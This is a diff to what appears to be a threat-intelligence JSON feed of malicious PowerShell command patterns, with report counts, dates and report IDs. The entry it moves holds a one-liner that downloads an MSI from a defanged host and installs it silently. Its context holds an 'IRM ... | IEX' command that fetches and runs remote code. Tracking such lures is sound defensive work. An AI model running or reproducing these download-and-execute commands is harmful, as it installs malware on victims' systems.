@@ -735,6 +735,41 @@
     ]
   },
   {
+    "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 23,
+    "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
+    "LastSeen": "2026-11-13T17:48:56.960000+00:00",
+    "ReportIds": [
+      "cmw90o6il2gli0omlwlr2xrzm",
+      "cmwclwpgw0a210omltnipi6za",
+      "cmwczsy7h0fjp0omltp7h00pn",
+      "cmwczsyh00fjs0omlcpl08ms7",
+      "cmwdbbxhf03710omlzn792mik",
+      "cmwdrfian04ln0omlizrkni0i",
+      "cmwds9z2204os0omlpy5c0lbi",
+      "cmwdvqh69058b0omlf4jk9bme",
+      "cmwdxp8ne05qu0omlyd8d0l2n",
+      "cmwe7sk0008dh0omlccbh502j",
+      "cmwe81gep08kc0omlw78d528q",
+      "cmwe8utpz09hc0omldgg04ffd",
+      "cmwe9dsyc0a6j0oml5eqqsnye",
+      "cmwe9gaoh0adf0omlnltwf2ue",
+      "cmwe9h7c80ael0oml442l41bk",
+      "cmwea5lgf0b6n0omlk8sgo9nq",
+      "cmwea9wm70b9q0oml4v5kca0d",
+      "cmweaigu40bil0omlfmyycqdj",
+      "cmwebebjc0c1o0oml57p74iht",
+      "cmwel9plu0czo0omlez5ttanw",
+      "cmwezgr170fas0omlma6arc0q",
+      "cmwf2w2a00fkl0oml1ac8kcxp",
+      "cmwf9tn7k0fqr0omliwntu216"
+    ],
+    "PayloadExamples": [
+      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
+    ]
+  },
+  {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
     "ReportCount": 23,
@@ -767,40 +802,6 @@
     ],
     "PayloadExamples": [
       "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
-    ]
-  },
-  {
-    "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 22,
-    "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
-    "LastSeen": "2026-11-13T14:34:52.466000+00:00",
-    "ReportIds": [
-      "cmw90o6il2gli0omlwlr2xrzm",
-      "cmwclwpgw0a210omltnipi6za",
-      "cmwczsy7h0fjp0omltp7h00pn",
-      "cmwczsyh00fjs0omlcpl08ms7",
-      "cmwdbbxhf03710omlzn792mik",
-      "cmwdrfian04ln0omlizrkni0i",
-      "cmwds9z2204os0omlpy5c0lbi",
-      "cmwdvqh69058b0omlf4jk9bme",
-      "cmwdxp8ne05qu0omlyd8d0l2n",
-      "cmwe7sk0008dh0omlccbh502j",
-      "cmwe81gep08kc0omlw78d528q",
-      "cmwe8utpz09hc0omldgg04ffd",
-      "cmwe9dsyc0a6j0oml5eqqsnye",
-      "cmwe9gaoh0adf0omlnltwf2ue",
-      "cmwe9h7c80ael0oml442l41bk",
-      "cmwea5lgf0b6n0omlk8sgo9nq",
-      "cmwea9wm70b9q0oml4v5kca0d",
-      "cmweaigu40bil0omlfmyycqdj",
-      "cmwebebjc0c1o0oml57p74iht",
-      "cmwel9plu0czo0omlez5ttanw",
-      "cmwezgr170fas0omlma6arc0q",
-      "cmwf2w2a00fkl0oml1ac8kcxp"
-    ],
-    "PayloadExamples": [
-      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
     ]
   },
   {
